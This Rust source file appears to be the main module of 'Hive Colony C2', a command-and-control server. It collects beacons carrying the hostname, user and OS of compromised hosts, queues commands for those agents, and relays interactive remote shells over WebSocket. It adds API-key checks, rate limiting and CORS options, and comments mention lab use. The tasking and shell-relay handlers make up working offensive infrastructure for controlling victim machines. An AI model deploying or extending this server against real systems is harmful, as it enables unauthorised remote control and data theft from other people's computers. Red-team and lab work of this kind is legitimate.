mod db;
mod session;
mod shell;

use std::collections::HashMap;
use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use std::sync::{Arc, Mutex as StdMutex};
use std::time::{Duration, Instant};

use axum::{
    extract::{ConnectInfo, Path, State, WebSocketUpgrade},
    http::{HeaderName, HeaderValue, StatusCode},
    middleware,
    response::{Html, IntoResponse, Json},
    routing::{get, post},
    Router,
};
use clap::Parser;
use serde::{Deserialize, Serialize};
use tokio::sync::Mutex;
use tower_http::cors::{AllowOrigin, CorsLayer};

use db::Db;
use session::SessionManager;

#[derive(Parser)]
#[command(name = "hive-c2", about = "Hive Colony C2 Server")]
struct Args {
    #[arg(long, default_value = "8444")]
    port: u16,

    #[arg(long, default_value = "0.0.0.0")]
    host: String,

    #[arg(long, default_value = "hive_c2.db")]
    db_path: PathBuf,

    /// Require the `x-api-key` header on agent/operator endpoints.
    /// Empty (default) disables authentication — retro-compatible with
    /// existing labs. `/` and `/health` always stay open for monitoring.
    #[arg(long, default_value = "")]
    api_key: String,

    /// Max requests per minute per client IP on all endpoints.
    /// 0 disables rate limiting. Default: 120 req/min.
    #[arg(long, default_value_t = 120)]
    rate_limit: u32,

    /// Allowed browser origin for CORS (repeatable), e.g. https://ops.example.com.
    /// Empty (default) sends no CORS headers — browsers block cross-origin reads.
    #[arg(long = "cors-origin")]
    cors_origins: Vec<String>,

    /// Opt-in escape hatch that restores the old permissive CORS
    /// (`Access-Control-Allow-Origin: *`). Only for throwaway labs.
    #[arg(long, default_value_t = false)]
    cors_anywhere: bool,
}

#[derive(Clone)]
struct AppState {
    db: Arc<Mutex<Db>>,
    sessions: Arc<Mutex<SessionManager>>,
    relay: shell::RelayMap,
    /// When non-empty, agent/operator endpoints require the `x-api-key`
    /// header to match this value (constant-time comparison).
    api_key: String,
    /// Shared per-IP rate limiter (public + protected routes).
    rate: Arc<RateLimiter>,
}

/// Fixed-window per-IP rate limiter kept fully in memory (no extra deps).
///
/// Each IP gets a bucket that resets every `window`. Buckets for IPs that
/// stop hitting the server are evicted lazily so the map cannot grow
/// unbounded under scanning.
struct RateLimiter {
    max: u32,
    window: Duration,
    buckets: StdMutex<HashMap<IpAddr, Bucket>>,
}

struct Bucket {
    window_start: Instant,
    count: u32,
}

impl RateLimiter {
    fn new(max: u32) -> Self {
        Self {
            max,
            window: Duration::from_secs(60),
            buckets: StdMutex::new(HashMap::new()),
        }
    }

    /// Register a hit for `ip`. Returns false when the fixed-window
    /// quota is exhausted (caller must answer 429).
    fn check(&self, ip: IpAddr) -> bool {
        if self.max == 0 {
            return true; // disabled
        }
        let now = Instant::now();
        let mut buckets = self.buckets.lock().unwrap();
        // Lazy eviction: keep the map bounded (4× the active quota).
        if buckets.len() > (self.max as usize) * 4 {
            buckets.retain(|_, b| now.duration_since(b.window_start) < self.window);
        }
        let bucket = buckets.entry(ip).or_insert(Bucket {
            window_start: now,
            count: 0,
        });
        if now.duration_since(bucket.window_start) >= self.window {
            bucket.window_start = now;
            bucket.count = 0;
        }
        bucket.count += 1;
        bucket.count <= self.max
    }
}

#[derive(Serialize)]
struct HealthResponse {
    status: &'static str,
    beacon_count: usize,
    sessions: usize,
}

#[derive(Deserialize)]
struct BeaconPayload {
    #[serde(default)]
    agent_id: String,
    #[serde(default)]
    agent_role: String,
    #[serde(default)]
    hostname: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    os: String,
    #[serde(default)]
    version: String,
    #[serde(flatten)]
    extra: std::collections::HashMap<String, serde_json::Value>,
}

#[derive(Serialize, Deserialize, Clone)]
struct Task {
    id: String,
    command: String,
    payload: serde_json::Value,
}

#[derive(Serialize)]
struct TaskResponse {
    tasks: Vec<Task>,
}

#[derive(Serialize)]
struct LogEntry {
    timestamp: String,
    agent_id: String,
    agent_role: String,
    #[serde(flatten)]
    data: serde_json::Value,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(tracing_subscriber::EnvFilter::from_default_env())
        .init();

    let args = Args::parse();

    let db = Db::open(&args.db_path).expect("Failed to open database");
    let sessions = SessionManager::new();
    let state = AppState {
        db: Arc::new(Mutex::new(db)),
        sessions: Arc::new(Mutex::new(sessions)),
        relay: Arc::new(Mutex::new(HashMap::new())),
        api_key: args.api_key,
        rate: Arc::new(RateLimiter::new(args.rate_limit)),
    };

    // CORS: closed by default; allow-list via --cors-origin, permissive only
    // with the explicit --cors-anywhere opt-in.
    let cors_layer = if args.cors_anywhere {
        tracing::warn!("CORS set to PERMISSIVE (--cors-anywhere) — only for throwaway labs");
        Some(CorsLayer::permissive())
    } else if args.cors_origins.is_empty() {
        tracing::info!(
            "CORS disabled (no --cors-origin) — browsers cannot read the API cross-origin"
        );
        None
    } else {
        let mut origins = Vec::new();
        for o in &args.cors_origins {
            let v = HeaderValue::from_str(o)
                .map_err(|e| format!("invalid --cors-origin '{o}': {e}"))
                .expect("invalid --cors-origin");
            origins.push(v);
        }
        let allow_headers = [
            HeaderName::from_static("content-type"),
            HeaderName::from_static("x-api-key"),
        ];
        tracing::info!(origins = ?args.cors_origins, "CORS allow-list active");
        Some(
            CorsLayer::new()
                .allow_origin(AllowOrigin::list(origins))
                .allow_methods([
                    axum::http::Method::GET,
                    axum::http::Method::POST,
                    axum::http::Method::OPTIONS,
                ])
                .allow_headers(allow_headers),
        )
    };

    // Public routes: liveness/monitoring stay reachable without a key so
    // `hive.sh status` and dashboards keep working unauthenticated.
    let public = Router::new()
        .route("/health", get(health_handler))
        .route("/", get(index_handler))
        .layer(middleware::from_fn_with_state(
            state.clone(),
            rate_limit_middleware,
        ))
        .with_state(state.clone());

    // Agent/operator routes: optionally guarded by the `x-api-key` header.
    // Layer order (outermost first = added last): CORS → rate limit → auth.
    let protected_base = Router::new()
        .route("/logs", get(logs_handler))
        .route("/beacon", post(beacon_handler))
        .route("/task/:agent_id", get(task_handler))
        .route("/task/:agent_id", post(task_push_handler))
        .route("/shell/:session_id", get(shell_handler))
        .route("/admin/sessions", get(admin_sessions_handler))
        .route("/admin/agents", get(admin_agents_handler))
        .route("/admin/metrics", get(admin_metrics_handler))
        .layer(middleware::from_fn_with_state(
            state.clone(),
            auth_middleware,
        ))
        .layer(middleware::from_fn_with_state(
            state.clone(),
            rate_limit_middleware,
        ));
    let protected = match &cors_layer {
        Some(cors) => protected_base.layer(cors.clone()),
        None => protected_base,
    }
    .with_state(state.clone());

    let app = public.merge(protected);

    let addr = SocketAddr::new(args.host.parse().expect("Invalid host address"), args.port);
    tracing::info!("C2 Server listening on http://{addr}");
    if state.api_key.is_empty() {
        tracing::warn!(
            "API authentication DISABLED (start with --api-key <secret> to require x-api-key)"
        );
    } else {
        tracing::info!("API authentication ENABLED — agents must send the x-api-key header");
    }
    if args.rate_limit == 0 {
        tracing::warn!("Rate limiting DISABLED (--rate-limit 0)");
    } else {
        tracing::info!(
            "Rate limiting ENABLED — {} req/min per client IP",
            args.rate_limit
        );
    }
    tracing::info!("  POST /beacon    - Agent heartbeats + task results");
    tracing::info!("  GET  /task/:id  - Task pull");
    tracing::info!("  GET  /shell/:id - WebSocket interactive shell");
    tracing::info!("  GET  /health    - Health check");
    tracing::info!("  GET  /logs      - Recent activity");

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await
    .unwrap();
}

/// Middleware that enforces the per-IP fixed-window rate limit.
///
/// Runs before auth so flooding is rejected (429) without paying the
/// API-key comparison, and applies to public + protected routes alike.
async fn rate_limit_middleware(
    State(state): State<AppState>,
    ConnectInfo(peer): ConnectInfo<SocketAddr>,
    req: axum::extract::Request,
    next: middleware::Next,
) -> Result<axum::response::Response, StatusCode> {
    if state.rate.check(peer.ip()) {
        Ok(next.run(req).await)
    } else {
        tracing::warn!(ip = %peer.ip(), path = %req.uri().path(), "Rate limit exceeded (429)");
        Err(StatusCode::TOO_MANY_REQUESTS)
    }
}

/// Middleware that enforces the optional `x-api-key` check.
///
/// When no API key is configured the request passes through untouched,
/// preserving the historical zero-config lab behaviour.
async fn auth_middleware(
    State(state): State<AppState>,
    req: axum::extract::Request,
    next: middleware::Next,
) -> Result<axum::response::Response, StatusCode> {
    if state.api_key.is_empty() {
        return Ok(next.run(req).await);
    }
    let provided = req.headers().get("x-api-key").and_then(|v| v.to_str().ok());
    if !api_key_matches(&state.api_key, provided) {
        tracing::warn!(path = %req.uri().path(), "Rejected request: missing/invalid x-api-key");
        return Err(StatusCode::UNAUTHORIZED);
    }
    Ok(next.run(req).await)
}

/// Compare a provided API key against the configured one.
///
/// Both sides are hashed with SHA-256 and the digests are folded with XOR
/// so the comparison time does not depend on where the bytes differ
/// (cheap constant-time check without extra dependencies).
fn api_key_matches(expected: &str, provided: Option<&str>) -> bool {
    let Some(provided) = provided else {
        return false;
    };
    if provided.is_empty() {
        return false;
    }
    use sha2::{Digest, Sha256};
    let h_expected = Sha256::digest(expected.as_bytes());
    let h_provided = Sha256::digest(provided.as_bytes());
    h_expected
        .iter()
        .zip(h_provided.iter())
        .fold(0u8, |acc, (a, b)| acc | (a ^ b))
        == 0
}

async fn health_handler(State(state): State<AppState>) -> Json<HealthResponse> {
    let beacon_count = {
        let db = state.db.lock().await;
        db.beacon_count()
    };
    let session_count = state.sessions.lock().await.list().len();

    Json(HealthResponse {
        status: "ok",
        beacon_count,
        sessions: session_count,
    })
}

async fn index_handler() -> Html<&'static str> {
    Html(
        r#"<!DOCTYPE html>
<html><head><title>Hive C2</title>
<style>
body{background:#0a0e14;color:#bfc7d5;font-family:monospace;padding:20px}
h1{color:#73d0a0}a{color:#5ccfe6}
.card{background:#131821;border:1px solid #1e2a3a;border-radius:6px;padding:12px;margin:8px 0}
</style></head><body>
<h1>HIVE C2 SERVER</h1>
<div class=card>
<a href=/health>/health</a> — Health check<br>
<a href=/logs>/logs</a> — Recent activity<br>
<a href=/admin/agents>/admin/agents</a> — Registered agents<br>
<a href=/admin/sessions>/admin/sessions</a> — Shell sessions<br>
<a href=/admin/metrics>/admin/metrics</a> — Operational metrics (ronda 12)<br>
</div>
<p style=color:#5c6773>Hive Colony v3.0 — Rust C2</p>
</body></html>"#,
    )
}

async fn logs_handler(State(state): State<AppState>) -> Json<Vec<LogEntry>> {
    let db = state.db.lock().await;
    Json(db.recent_activity(50))
}

async fn beacon_handler(
    State(state): State<AppState>,
    headers: axum::http::HeaderMap,
    body: axum::body::Bytes,
) -> Json<serde_json::Value> {
    let agent_id = headers
        .get("x-agent-id")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown");
    let agent_role = headers
        .get("x-agent-role")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown");

    let mut payload: BeaconPayload = serde_json::from_slice(&body).unwrap_or(BeaconPayload {
        agent_id: agent_id.to_string(),
        agent_role: agent_role.to_string(),
        hostname: String::new(),
        username: String::new(),
        os: String::new(),
        version: String::new(),
        extra: std::collections::HashMap::new(),
    });
    if payload.agent_id.is_empty() {
        payload.agent_id = agent_id.to_string();
    }
    if payload.agent_role.is_empty() {
        payload.agent_role = agent_role.to_string();
    }

    // Stream shell results to the attached operator session, if any.
    // A beacon frame of the form {"session": "...", "output": "..."} is a
    // reply produced by an agent for an interactive shell task.
    if let (Some(session), Some(output)) = (
        payload.extra.get("session").and_then(|v| v.as_str()),
        payload.extra.get("output").and_then(|v| v.as_str()),
    ) {
        let line = format!("[{session}] {output}");
        shell::relay_to_session(&state, session, line).await;
    }

    {
        let db = state.db.lock().await;
        db.record_beacon(
            &payload.agent_id,
            &payload.agent_role,
            &payload.hostname,
            &payload.username,
            &payload.os,
            &payload.version,
            &serde_json::to_value(&payload.extra).unwrap_or_default(),
        );
    }

    tracing::info!(agent = %agent_id, role = %agent_role, "Beacon received");

    let beacon_count = {
        let db = state.db.lock().await;
        db.beacon_count()
    };
    Json(serde_json::json!({
        "status": "ack",
        "beacon_count": beacon_count,
    }))
}

async fn task_handler(
    State(state): State<AppState>,
    Path(agent_id): Path<String>,
) -> Json<TaskResponse> {
    let db = state.db.lock().await;
    let tasks = db.pending_tasks(&agent_id);
    Json(TaskResponse { tasks })
}

async fn task_push_handler(
    State(state): State<AppState>,
    Path(agent_id): Path<String>,
    Json(task): Json<Task>,
) -> StatusCode {
    let db = state.db.lock().await;
    db.push_task(&agent_id, &task.id, &task.command, &task.payload);
    tracing::info!(agent = %agent_id, command = %task.command, "Task pushed");
    StatusCode::CREATED
}

async fn shell_handler(
    State(state): State<AppState>,
    Path(session_id): Path<String>,
    ws: WebSocketUpgrade,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| shell::handle_shell(socket, state, session_id))
}

async fn admin_sessions_handler(State(state): State<AppState>) -> Json<Vec<shell::SessionInfo>> {
    let sessions = state.sessions.lock().await;
    Json(sessions.list())
}

async fn admin_agents_handler(State(state): State<AppState>) -> Json<serde_json::Value> {
    let db = state.db.lock().await;
    Json(db.agent_summary())
}

/// Ronda 12: métricas operativas REALES (contadores de la BD) para
/// operador/monitoring. Mismo scope protegido que el resto de /admin/*.
async fn admin_metrics_handler(State(state): State<AppState>) -> Json<serde_json::Value> {
    let db = state.db.lock().await;
    Json(db.metrics())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn api_key_disabled_when_empty() {
        // An empty configured key means "auth off"; the middleware short-
        // circuits, but the matcher itself must still be conservative.
        assert!(!api_key_matches("", Some("anything")));
        assert!(!api_key_matches("", None));
    }

    #[test]
    fn api_key_accepts_exact_match() {
        assert!(api_key_matches("lab-secret-123", Some("lab-secret-123")));
    }

    #[test]
    fn api_key_rejects_wrong_or_missing() {
        assert!(!api_key_matches("lab-secret-123", Some("wrong")));
        assert!(!api_key_matches("lab-secret-123", None));
        assert!(!api_key_matches("lab-secret-123", Some("")));
        // Prefixes must not authenticate.
        assert!(!api_key_matches("lab-secret-123", Some("lab-secret")));
    }

    #[test]
    fn rate_limiter_blocks_over_quota_per_ip() {
        let limiter = RateLimiter::new(3);
        let a: IpAddr = "10.0.0.1".parse().unwrap();
        let b: IpAddr = "10.0.0.2".parse().unwrap();

        assert!(limiter.check(a));
        assert!(limiter.check(a));
        assert!(limiter.check(a));
        // Quota exhausted for A...
        assert!(!limiter.check(a));
        // ...but B is unaffected (per-IP isolation).
        assert!(limiter.check(b));
    }

    #[test]
    fn rate_limiter_disabled_when_max_zero() {
        let limiter = RateLimiter::new(0);
        let a: IpAddr = "10.0.0.1".parse().unwrap();
        for _ in 0..10_000 {
            assert!(limiter.check(a));
        }
    }

    #[test]
    fn rate_limiter_resets_after_window() {
        let limiter = RateLimiter::new(1);
        let a: IpAddr = "10.0.0.9".parse().unwrap();
        assert!(limiter.check(a));
        assert!(!limiter.check(a));

        // Force the window to look expired (test-only shortcut: rewrite
        // the bucket start timestamp instead of sleeping 60s).
        {
            let mut buckets = limiter.buckets.lock().unwrap();
            let bucket = buckets.get_mut(&a).unwrap();
            bucket.window_start = Instant::now() - Duration::from_secs(61);
        }
        assert!(limiter.check(a));
    }
}
